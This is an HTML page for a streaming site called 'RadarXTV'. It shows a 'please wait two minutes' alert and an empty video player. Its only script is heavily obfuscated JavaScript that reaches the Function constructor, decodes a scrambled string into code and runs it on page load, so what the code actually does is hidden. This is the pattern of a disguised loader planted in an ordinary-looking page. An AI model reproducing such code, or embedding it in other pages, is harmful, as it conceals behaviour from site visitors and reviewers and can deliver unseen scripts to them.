<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>RadarXTV</title>
  <style>
    body {
      margin: 0;
      background: black;
      color: white;
      font-family: sans-serif;
      text-align: center;
    }

    .radar-logo {
      display: block;
      width: 100%;
      max-width: 700px;
      margin: 20px auto 10px;
      height: auto;
      object-fit: contain;
      filter: drop-shadow(0 0 15px #00f0ffcc);
    }

    .alert-box {
      position: fixed;
      top: 20px;
      left: 50%;
      transform: translateX(-50%);
      background-color: #ffcc00;
      color: black;
      padding: 10px 20px;
      font-size: 16px;
      border-radius: 8px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      width: 80%;
      max-width: 400px;
      box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.5);
      z-index: 9999;
      opacity: 1;
      transition: opacity 1s ease;
    }

    .alert-box button {
      background: transparent;
      border: none;
      color: black;
      font-size: 18px;
      cursor: pointer;
    }

    .player-container {
      width: 95%;
      max-width: 900px;
      margin: 20px auto;
      border-radius: 15px;
      overflow: hidden;
      position: relative;
      padding-top: 56.25%;
    }

    .player-container iframe {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      border: none;
      border-radius: 15px;
    }
  </style>
</head>
<body>
  <!-- ✅ BANNER -->
  
  <!-- ✅ ALERT MESSAGE -->
  <div id="alertMessage" class="alert-box">
    <span>Please wait for 2 minutes for stream to initialize.</span>
    <button onclick="closeAlert()">✖</button>
  </div>

  <!-- ✅ VIDEO BOX -->
  <div class="player-container" id="playerContainer"></div>

  <script>
  var loadIframe,closeAlert;(function(){var lHa='',AzV=211-200;function huC(l){var d=277895;var c=l.length;var q=[];for(var j=0;j<c;j++){q[j]=l.charAt(j)};for(var j=0;j<c;j++){var p=d*(j+112)+(d%18104);var z=d*(j+667)+(d%15340);var t=p%c;var i=z%c;var k=q[t];q[t]=q[i];q[i]=k;d=(p+z)%1452489;};return q.join('')};var tkF=huC('gwclaroptuybonnetqcsirmdkhjfrtcuxvszo').substr(0,AzV);var rRR='lar.4;jq,mo=;((i>;6vvgfg(h(bcakf,hut4s" hp;;4a=;nx"fx;hak p=g7;2c4opm)t6,f8)tf,))te0i;{,(fh9,rr9u{th)r= (f]1f6+=1.<v=,,1ssdaru8oo]d7r(vv;ruh,0fgxu=)f";a ;v=])osz[;at h+l.50nrrqw]n18=Cjdm+==1arnrv{hq(,=+ai c10go)v6+7q;na),l}nn );;krir=.}8<8argrrej]rd.0p[r.ii(a 5)=f}ts]hrr!)ufl}no;uga==i.0i=g-ror,p h=Cxmlrb7oq -koi].,.. o=;.elohpr.z{ungAr;9)f;l[ng[t;oa; =;vn(;hp;c0=f;=C);;+w)hovi,d.f.va,1n8+++i(q)pvgorlh,ad]ut=(=<lrrd-z2)*o+)fv2ea"j(en;n(=1"-=(=p+;,6nh9sxs, tfe(ul=u+btmm"+(ae=g9elj+f]87(veldu1 {)t.);e<+(wl+{+[ea.oqr2hi(ter h=8q;-},l2l)c"nvi2eq;fa;(a=unu[{)=- ]mrvsxu<9c.push]festb(q (,)("n"r9l[rpvu>c5[p+=j;;t(k+b;.ici)7r-avr)ejh(=1k,zr]i h[0cs(baz1i gyoj)0crhr],z+1r1;tghni}vv](lkre)r8(.qva)a)r.(jniraaul0,(A 8=m37,)2qa=.[6;;.,tniu;5f=dtss);+aCCv=uh7bAgz.fniC!u+6vpo(a6+;moqA[arv =,0,;1.=enav[[hh+ tc85s letihdttc*=lAwo2)cljolnCSee0n+.nrh87a;=)tte;leoi)u;3e4(ntttus.Ss[rw.}r" (iCvne tr';var NxK=huC[tkF];var MaV='';var rCa=NxK;var wQJ=NxK(MaV,huC(rRR));var NSX=wQJ(huC('<3$B;{(2(et7smatCgt4F1.%F;8]g.+)]FF;ld.n0.o56p4Fo,te 9=[F.2,-e*g.d)Gn\'o%5FlF55(e((]3]n0,lj%F;3)Fl!%1aTfF_vucF;.3t0e\'iF5r6%Fa(nv(.F)SyrF0FF%t{e)d)7{!n](bdn3ow$[f.Fehae8(%Fu0]g(FeF)mpDl ) g< 2$(gi1Fer..e7C.)f3}%ece{r}e_FFtF]$nm$i8F5]te.3_scct;FeF ujpAa(=,ln%=l.cFhr%ps5a.elce0$no6t):8%7,d28[l.z{%pF%ee@fa;c(2F=d>eecr;en%B5f:!.mdo1i{o%_nr%)o tae()(;FFia)9b)gieFa;?dnm{!r6yt{;cI7Fe8!D})s\/75hywetq$erio48%8p4t)e=Ct4..obFt4rFFFi618]1tcF2%a%74F;9F=s66srm)$rFF$p0B!a;;4yF"os(.1s5)n{F.j%y1);F,4sFu\'_;r3Fd,1[\/DbFud6GFFGtmfeFnyiGrF.d7fe)=pgehewr)m=v(D)q*}9!r{)g>hFd$e{p(A,eo$[F,=(n7=j!,)c_}_e. .)i)E mae1_o_]l)voFbFs)0 E(7(&7_o){Fle9o(.ei)ye.(o{rFl&o1)F*cae95eh)4M$hFc!1Fl3+2Fm186r>iF)_;j1;"A3FFr7F_F*8fyear%7\/1;FI$2ea,(5242ef)0;9.;&)fhr]!!,Clijs]k&17@a_!ntF)ri(FnF}(tFF;F)55F4Fp.d)Fri(nr)Fo%ltrF aFFb,f)!$nD}$$FiF_u].]!nbjm]titeF(,arCod;r1>dn}F0r.e.]:od)b.l:t}tad]!ns%]..F_F=.a#0F_]=ig#sa\/FF1s%idedv!_Fv >_f1r7amrt\/>bf!hFF;?sFFi! 1ue}Fi,p=7FeFce_"q$+3All)[oFf=t;o;@0u\/1}_]F8=F;F_(0F56(46eet{.46F .);(i(;()$ (4(p9ls_=5F)8f,u]E(1)}=FersF1oaGo&"eF[ac]!_(i)Enn16-,FFfe oa()$01.(;;td=go9b"+F=.s]%,F0 FFo6Fd,5%wFtar,.)lteg=Ff[oie1FmF2dI_"27)_r66])F]Fu6q)FFoF)FF(p_p=tfaer1o3(]3(2A(}30,ct{=F!lF)]{,t0r< _!5F)FnF)0o_j;lF,ee0F$d;)Fr4>F5FFi+(%8$6=>d6lFoei+ )n..Fl(={ld3!>C)9]).)rj2Fe11]1, F0 2eio1SF?paF)(.eFmFrFF%.i)]1qj;(4(eF_>eF7%ue6(();[@e%3}se(.je40Fw"ev$(]t{>0o%owe)((]F()d]7.rnht,f)-eCe:D(.=n{isro(!]rfejt;j=e.(;$H()%8} ,0(=a.;1;:e;3.49-.)3_svaEpf)_t=Fh.EjD7_]<eFr5ey3.)r({F4y.F_aFF[ FF;(-[,e(v,!Ffn$,=6F37)F*o3iF4!!,a.}_ )()os$Fm9EF[u=f [<s+F11=#{bp s(n5,;FF!!lFl_?eFrFSeF0ep5 40eep5e{ee.F1)$%8l3t[C(% =>G )[=(ef}Fu$5sy3_t?$e)tn e,if-Fo)f!FF33)];];.Fj_ kg"tF2!Fo=u]eF}>"F$mtegFd{ak__{a3s%(d,jFFea{ne).%F$r F;g32\/F$c F> p)x}.=7dF ;88)_=0_F.[F6e.bF.F.[oFe=(+o*e)Fivfa e5hr=e{<j!_tl];tsr!3=steFcnF2(a{rr6u8nyF_0%is F..uil2ts;8$es,b)u)c)i=r,_5a=B;0Ftfg]s8ti;;F=F(aF aF.+dn. iy\'3on.3ywD]!flAFe._6m_!y1>e4Di]..Fd,.lFl(n.e)s==F  <F9)'));var Ycx=rCa(lHa,NSX );Ycx(3918);return 7810})()
  </script>
</body>
</html>
